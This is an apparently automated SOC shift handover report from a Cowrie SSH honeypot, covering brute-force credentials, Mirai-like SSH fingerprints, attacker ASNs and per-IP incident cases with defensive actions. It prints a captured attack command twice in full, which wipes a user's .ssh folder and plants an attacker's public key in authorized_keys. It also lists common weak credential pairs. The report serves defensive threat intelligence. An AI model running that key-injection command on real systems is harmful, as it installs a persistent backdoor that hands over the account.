# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-27 |
| **Generated At** | 2026-07-27T14:44:43Z |
| **Shift Time** | 14:44 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **144** |
| Confirmed Threats | **128** |
| False Positives Filtered | **16** (11.1%) |
| Unique Attacker IPs | **75** |
| Countries of Origin | **32** |
| High Severity Cases | **46** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **98** |
| Malware Samples Analyzed | **3** HIGH · **31** MED · 12 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **94** |
| Unique Credential Pairs | **56** |
| Unique Usernames | **14** |
| Unique Passwords | **55** |
| Successful Auth Pairs | **86** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 44 |
| `postgres` | 10 |
| `centos` | 7 |
| `guest` | 7 |
| `nobody` | 6 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `qwer1234` | 5 |
| `passw0rd` | 5 |
| `centos222` | 4 |
| `guest99` | 4 |
| `4444444` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `postgres` | `qwer1234` | 5 |
| `postgres` | `passw0rd` | 5 |
| `centos` | `centos222` | 4 |
| `guest` | `guest99` | 4 |
| `blank` | `4444444` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `P@$$w0rd@123` | `10.0.0.73` | 2026-07-27T10:57:55 |
| `root` | `ssh-probe-A5BF75844DF3E75C796FCF5A767B41094BD902123D3FAC11` | `10.0.0.73` | 2026-07-27T10:57:55 |
| `postgres` | `qwer1234` | `120.194.50.39` | 2026-07-27T11:06:09 |
| `postgres` | `qwer1234` | `60.174.35.18` | 2026-07-27T11:06:19 |
| `root` | `P@55word!` | `10.0.0.73` | 2026-07-27T11:06:40 |
| `root` | `ssh-probe-1520A1C4ECFA9E46DC23321E9893118DD23CF3187F6C4EF9` | `10.0.0.73` | 2026-07-27T11:06:41 |
| `user` | `4` | `91.144.158.62` | 2026-07-27T11:08:42 |
| `user` | `4` | `10.0.0.73` | 2026-07-27T11:09:07 |
| `postgres` | `qwer1234` | `111.70.14.135` | 2026-07-27T11:09:33 |
| `postgres` | `qwer1234` | `103.147.248.44` | 2026-07-27T11:09:46 |
| `postgres` | `qwer1234` | `10.0.0.73` | 2026-07-27T11:09:56 |
| `root` | `pas$w0rd12345` | `10.0.0.73` | 2026-07-27T11:11:00 |
| `root` | `ssh-probe-9A01C9E0A9574A99C455839CD2224F905F3C6D7176B753AC` | `10.0.0.73` | 2026-07-27T11:11:01 |
| `root` | `p4$sw0rd@123456` | `10.0.0.73` | 2026-07-27T11:15:24 |
| `root` | `ssh-probe-D024B6810723CF8819E14FCD6FF6EF95FE9A20C31C96A424` | `10.0.0.73` | 2026-07-27T11:15:25 |
| `dockeruser` | `docker` | `14.103.118.113` | 2026-07-27T11:15:43 |
| `root` | `Adm!n1` | `10.0.0.73` | 2026-07-27T11:19:57 |
| `root` | `ssh-probe-AFD88D6B395C06E2B4C4AFA51D75E299AFD31A1F942E7077` | `10.0.0.73` | 2026-07-27T11:19:59 |
| `root` | `password2026` | `10.0.0.73` | 2026-07-27T11:24:20 |
| `root` | `ssh-probe-C7280702C054E7A102F883BB5F5A275C456FF88A98EB0A22` | `10.0.0.73` | 2026-07-27T11:24:21 |
| `root` | `P@ss1` | `112.197.2.116` | 2026-07-27T11:25:40 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-27T11:27:05 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-27T11:27:05 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-27T11:27:14 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `45.156.131.22` | 2026-07-27T11:27:24 |
| `centos` | `centos222` | `60.166.8.174` | 2026-07-27T11:29:59 |
| `centos` | `centos222` | `220.246.42.227` | 2026-07-27T11:30:08 |
| `guest` | `guest99` | `187.115.144.103` | 2026-07-27T11:30:44 |
| `guest` | `guest99` | `62.220.104.155` | 2026-07-27T11:30:53 |
| `root` | `P@5sword` | `10.0.0.73` | 2026-07-27T11:33:27 |
| `root` | `ssh-probe-C40E22E504870E347777A86F23E8E7E900854A95088A5F37` | `10.0.0.73` | 2026-07-27T11:33:28 |
| `centos` | `centos222` | `10.0.0.73` | 2026-07-27T11:33:43 |
| `guest` | `guest99` | `10.0.0.73` | 2026-07-27T11:34:31 |
| `root` | `test.123` | `186.16.213.54` | 2026-07-27T11:34:52 |
| `345gs5662d34` | `345gs5662d34` | `186.16.213.54` | 2026-07-27T11:34:55 |
| `root` | `3245gs5662d34` | `186.16.213.54` | 2026-07-27T11:34:56 |
| `ubuntu` | `123321` | `82.65.140.218` | 2026-07-27T11:40:48 |
| `ubuntu` | `123321` | `203.198.173.137` | 2026-07-27T11:40:56 |
| `root` | `P4$5w0rd1234` | `10.0.0.73` | 2026-07-27T11:42:15 |
| `root` | `ssh-probe-E6E97021558C289B9B778117839843500D4092DE0346A0DD` | `10.0.0.73` | 2026-07-27T11:42:16 |
| `root` | `zxc123ASD` | `10.0.0.73` | 2026-07-27T11:46:46 |
| `root` | `ssh-probe-547727284E6D166D227AF7B80A85E268E4832A1F9C5A06D0` | `10.0.0.73` | 2026-07-27T11:46:47 |
| `nobody` | `33333` | `155.212.17.174` | 2026-07-27T11:54:18 |
| `oracle` | `passwd` | `196.188.93.169` | 2026-07-27T11:55:16 |
| `root` | `Qaz!@#123` | `10.0.0.73` | 2026-07-27T11:55:53 |
| `root` | `ssh-probe-0E50B649EBC37784007DBCEBA5E051A9FF63A6E11D4AE401` | `10.0.0.73` | 2026-07-27T11:55:54 |
| `nobody` | `33333` | `10.0.0.73` | 2026-07-27T11:58:10 |
| `oracle` | `passwd` | `123.129.245.249` | 2026-07-27T11:58:28 |
| `oracle` | `password` | `190.57.233.133` | 2026-07-27T12:02:03 |
| `git` | `gitgitgit` | `161.132.54.218` | 2026-07-27T12:09:44 |
| `345gs5662d34` | `345gs5662d34` | `161.132.54.218` | 2026-07-27T12:09:47 |
| `git` | `3245gs5662d34` | `161.132.54.218` | 2026-07-27T12:09:48 |
| `root` | `Passw0rd12345` | `10.0.0.73` | 2026-07-27T12:14:05 |
| `root` | `ssh-probe-BF415D16D0EB19DC8E1D97595A4F60A71208E8C64E682107` | `10.0.0.73` | 2026-07-27T12:14:07 |
| `centos` | `999999` | `108.90.216.10` | 2026-07-27T12:18:49 |
| `postgres` | `passw0rd` | `36.64.36.101` | 2026-07-27T12:19:38 |
| `postgres` | `passw0rd` | `186.239.41.74` | 2026-07-27T12:19:50 |
| `centos` | `999999` | `36.93.154.207` | 2026-07-27T12:22:17 |
| `centos` | `999999` | `10.0.0.73` | 2026-07-27T12:22:40 |
| `root` | `eve` | `165.154.200.214` | 2026-07-27T12:22:57 |
| `345gs5662d34` | `345gs5662d34` | `165.154.200.214` | 2026-07-27T12:23:01 |
| `root` | `3245gs5662d34` | `165.154.200.214` | 2026-07-27T12:23:02 |
| `postgres` | `passw0rd` | `78.197.6.173` | 2026-07-27T12:23:18 |
| `root` | `admin@2020` | `10.0.0.73` | 2026-07-27T12:23:21 |
| `root` | `ssh-probe-D31427FF90572A1278BACC2F00AA8CC4986DAE2B2675A970` | `10.0.0.73` | 2026-07-27T12:23:22 |
| `postgres` | `passw0rd` | `10.0.0.73` | 2026-07-27T12:23:32 |
| `root` | `Noy123456789` | `10.0.0.73` | 2026-07-27T12:27:56 |
| `root` | `ssh-probe-CF6DAA0D46E8A5103F87E74770222ABA3AF7932E5F21FFE5` | `10.0.0.73` | 2026-07-27T12:27:57 |
| `blank` | `4444444` | `61.143.227.17` | 2026-07-27T12:29:53 |
| `blank` | `4444444` | `89.203.142.96` | 2026-07-27T12:29:59 |
| `blank` | `4444444` | `10.0.0.73` | 2026-07-27T12:30:16 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-27T12:31:40 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-27T12:31:41 |
| `root` | `qw123456@` | `10.0.0.73` | 2026-07-27T12:37:17 |
| `root` | `ssh-probe-A4ED7752C95C2D06576A87F2B7C8602B9072B5835F968182` | `10.0.0.73` | 2026-07-27T12:37:18 |
| `root` | `Admin1234567!` | `10.0.0.73` | 2026-07-27T12:41:59 |
| `root` | `ssh-probe-E5041B95474264BA5F808306261E44DC148AF27E9049B146` | `10.0.0.73` | 2026-07-27T12:42:00 |
| `nobody` | `nobody444` | `122.187.227.152` | 2026-07-27T12:43:33 |
| `nobody` | `nobody444` | `10.0.0.73` | 2026-07-27T12:47:08 |
| `mysql` | `qwerty1234` | `14.194.128.158` | 2026-07-27T12:47:33 |
| `mysql` | `qwerty1234` | `10.0.0.73` | 2026-07-27T12:47:52 |
| `root` | `123@@@` | `144.22.238.238` | 2026-07-27T12:49:27 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-07-27T12:49:27 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-07-27T12:49:39 |
| `guest` | `222222` | `113.11.34.221` | 2026-07-27T12:54:40 |
| `guest` | `222222` | `10.0.0.73` | 2026-07-27T12:54:52 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **144** |
| Sessions with Fingerprint | **9** |
| Unique HASSH Fingerprints | **9** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 28 |
| libssh | 25 |
| Paramiko (Python) | 9 |
| Perl Net::SSH | 2 |
| Go SSH scanner | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 27 | 27 |
| `f555226df196...` | Mirai/variant | 12 | 4 |
| `a2de0f306611...` | Mirai/variant | 9 | 3 |
| `3c0eaacec19b...` | Mirai/variant | 2 | 2 |
| `873a5fb5fedc...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 27 | 27 | Mirai/variant |
| `95420f9d932d...` | libssh | 12 | 4 | — |
| `f555226df196...` | libssh | 12 | 4 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 9 | 3 | Mirai/variant |
| `3c0eaacec19b...` | Perl Net::SSH | 2 | 2 | Mirai/variant |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `e37f354a101a...` | libssh | 1 | 1 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `161.132.54.218`, `14.103.118.113`, `186.16.213.54`, `165.154.200.214`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **75** |
| Unique ASNs | **56** |
| High-Risk ASNs | **46** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS213412` | ONYPHE SAS | 6 | HIGH |
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |
| `AS46562` | Performive LLC | 4 | LOW |
| `AS31898` | Oracle Corporation | 3 | HIGH |
| `AS22773` | Cox Communications Inc. | 3 | MEDIUM |
| `AS7713` | PT Telekomunikasi Indonesia | 2 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |
| `AS12322` | Free SAS | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (46)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-c47c16111be3

| Field | Detail |
|---|---|
| **Source IP** | `120.194.50[.]39` |
| **First Seen** | 2026-07-27 11:06 |
| **Last Seen** | 2026-07-27 11:06 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 11:06:05` | `cowrie.session.connect` |
| `2026-07-27 11:06:06` | `cowrie.client.version` |
| `2026-07-27 11:06:06` | `cowrie.client.kex` |
| `2026-07-27 11:06:09` | `cowrie.login.success` |
| `2026-07-27 11:06:10` | `cowrie.direct-tcpip.request` |
| `2026-07-27 11:06:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.194.50[.]39` to AbuseIPDB if not already reported
- [ ] Block `120.194.50[.]39` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f08c842e033c

| Field | Detail |
|---|---|
| **Source IP** | `60.174.35[.]18` |
| **First Seen** | 2026-07-27 11:06 |
| **Last Seen** | 2026-07-27 11:06 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 11:06:16` | `cowrie.session.connect` |
| `2026-07-27 11:06:17` | `cowrie.client.version` |
| `2026-07-27 11:06:17` | `cowrie.client.kex` |
| `2026-07-27 11:06:19` | `cowrie.login.success` |
| `2026-07-27 11:06:19` | `cowrie.direct-tcpip.request` |
| `2026-07-27 11:06:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.174.35[.]18` to AbuseIPDB if not already reported
- [ ] Block `60.174.35[.]18` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f357e7c17395

| Field | Detail |
|---|---|
| **Source IP** | `91.144.158[.]62` |
| **First Seen** | 2026-07-27 11:08 |
| **Last Seen** | 2026-07-27 11:08 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 11:08:41` | `cowrie.session.connect` |
| `2026-07-27 11:08:41` | `cowrie.client.version` |
| `2026-07-27 11:08:41` | `cowrie.client.kex` |
| `2026-07-27 11:08:42` | `cowrie.login.success` |
| `2026-07-27 11:08:42` | `cowrie.direct-tcpip.request` |
| `2026-07-27 11:08:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.144.158[.]62` to AbuseIPDB if not already reported
- [ ] Block `91.144.158[.]62` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ff3a0ac2946

| Field | Detail |
|---|---|
| **Source IP** | `111.70.14[.]135` |
| **First Seen** | 2026-07-27 11:09 |
| **Last Seen** | 2026-07-27 11:09 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 11:09:31` | `cowrie.session.connect` |
| `2026-07-27 11:09:31` | `cowrie.client.version` |
| `2026-07-27 11:09:31` | `cowrie.client.kex` |
| `2026-07-27 11:09:33` | `cowrie.login.success` |
| `2026-07-27 11:09:34` | `cowrie.direct-tcpip.request` |
| `2026-07-27 11:09:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.14[.]135` to AbuseIPDB if not already reported
- [ ] Block `111.70.14[.]135` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47149e54be9e

| Field | Detail |
|---|---|
| **Source IP** | `103.147.248[.]44` |
| **First Seen** | 2026-07-27 11:09 |
| **Last Seen** | 2026-07-27 11:09 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 11:09:43` | `cowrie.session.connect` |
| `2026-07-27 11:09:44` | `cowrie.client.version` |
| `2026-07-27 11:09:44` | `cowrie.client.kex` |
| `2026-07-27 11:09:46` | `cowrie.login.success` |
| `2026-07-27 11:09:47` | `cowrie.direct-tcpip.request` |
| `2026-07-27 11:09:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.147.248[.]44` to AbuseIPDB if not already reported
- [ ] Block `103.147.248[.]44` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c023a94d1623

| Field | Detail |
|---|---|
| **Source IP** | `14.103.118[.]113` |
| **First Seen** | 2026-07-27 11:15 |
| **Last Seen** | 2026-07-27 11:16 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 11:15:39` | `cowrie.session.connect` |
| `2026-07-27 11:15:40` | `cowrie.client.version` |
| `2026-07-27 11:15:40` | `cowrie.client.kex` |
| `2026-07-27 11:15:43` | `cowrie.login.success` |
| `2026-07-27 11:15:44` | `cowrie.session.params` |
| `2026-07-27 11:15:44` | `cowrie.command.input` |
| `2026-07-27 11:15:44` | `cowrie.command.failed` |
| `2026-07-27 11:15:44` | `cowrie.log.closed` |
| `2026-07-27 11:15:45` | `cowrie.session.params` |
| `2026-07-27 11:15:45` | `cowrie.command.input` |
| `2026-07-27 11:15:46` | `cowrie.session.file_download` |
| `2026-07-27 11:15:46` | `cowrie.log.closed` |
| `2026-07-27 11:16:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.118[.]113` to AbuseIPDB if not already reported
- [ ] Block `14.103.118[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97d57d1a897e

| Field | Detail |
|---|---|
| **Source IP** | `112.197.2[.]116` |
| **First Seen** | 2026-07-27 11:25 |
| **Last Seen** | 2026-07-27 11:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 11:25:39` | `cowrie.session.connect` |
| `2026-07-27 11:25:39` | `cowrie.client.version` |
| `2026-07-27 11:25:40` | `cowrie.client.kex` |
| `2026-07-27 11:25:40` | `cowrie.login.success` |
| `2026-07-27 11:25:41` | `cowrie.session.params` |
| `2026-07-27 11:25:41` | `cowrie.command.input` |
| `2026-07-27 11:25:42` | `cowrie.log.closed` |
| `2026-07-27 11:25:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.197.2[.]116` to AbuseIPDB if not already reported
- [ ] Block `112.197.2[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d95a273b7d2b

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-27 11:27 |
| **Last Seen** | 2026-07-27 11:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 11:27:04` | `cowrie.session.connect` |
| `2026-07-27 11:27:04` | `cowrie.client.version` |
| `2026-07-27 11:27:04` | `cowrie.client.kex` |
| `2026-07-27 11:27:05` | `cowrie.login.success` |
| `2026-07-27 11:27:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ababb893ca8

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-27 11:27 |
| **Last Seen** | 2026-07-27 11:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 11:27:05` | `cowrie.session.connect` |
| `2026-07-27 11:27:05` | `cowrie.client.version` |
| `2026-07-27 11:27:05` | `cowrie.client.kex` |
| `2026-07-27 11:27:05` | `cowrie.login.success` |
| `2026-07-27 11:27:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb8807881d67

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-27 11:27 |
| **Last Seen** | 2026-07-27 11:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 11:27:14` | `cowrie.session.connect` |
| `2026-07-27 11:27:14` | `cowrie.client.version` |
| `2026-07-27 11:27:14` | `cowrie.client.kex` |
| `2026-07-27 11:27:14` | `cowrie.login.success` |
| `2026-07-27 11:27:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fc03cc60cf4

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-27 11:27 |
| **Last Seen** | 2026-07-27 11:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 11:27:14` | `cowrie.session.connect` |
| `2026-07-27 11:27:14` | `cowrie.client.version` |
| `2026-07-27 11:27:14` | `cowrie.client.kex` |
| `2026-07-27 11:27:14` | `cowrie.login.success` |
| `2026-07-27 11:27:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c23e6839222

| Field | Detail |
|---|---|
| **Source IP** | `45.156.131[.]22` |
| **First Seen** | 2026-07-27 11:27 |
| **Last Seen** | 2026-07-27 11:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.86 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 11:27:24` | `cowrie.session.connect` |
| `2026-07-27 11:27:24` | `cowrie.login.success` |
| `2026-07-27 11:27:25` | `cowrie.session.params` |
| `2026-07-27 11:27:25` | `cowrie.command.input` |
| `2026-07-27 11:27:25` | `cowrie.command.input` |
| `2026-07-27 11:27:25` | `cowrie.command.failed` |
| `2026-07-27 11:27:25` | `cowrie.command.input` |
| `2026-07-27 11:27:25` | `cowrie.command.failed` |
| `2026-07-27 11:27:25` | `cowrie.command.input` |
| `2026-07-27 11:27:25` | `cowrie.log.closed` |
| `2026-07-27 11:27:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.131[.]22` to AbuseIPDB if not already reported
- [ ] Block `45.156.131[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94fe94d700da

| Field | Detail |
|---|---|
| **Source IP** | `60.166.8[.]174` |
| **First Seen** | 2026-07-27 11:29 |
| **Last Seen** | 2026-07-27 11:30 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 11:29:56` | `cowrie.session.connect` |
| `2026-07-27 11:29:57` | `cowrie.client.version` |
| `2026-07-27 11:29:57` | `cowrie.client.kex` |
| `2026-07-27 11:29:59` | `cowrie.login.success` |
| `2026-07-27 11:30:00` | `cowrie.direct-tcpip.request` |
| `2026-07-27 11:30:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.166.8[.]174` to AbuseIPDB if not already reported
- [ ] Block `60.166.8[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e679fd37e865

| Field | Detail |
|---|---|
| **Source IP** | `220.246.42[.]227` |
| **First Seen** | 2026-07-27 11:30 |
| **Last Seen** | 2026-07-27 11:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 11:30:06` | `cowrie.session.connect` |
| `2026-07-27 11:30:06` | `cowrie.client.version` |
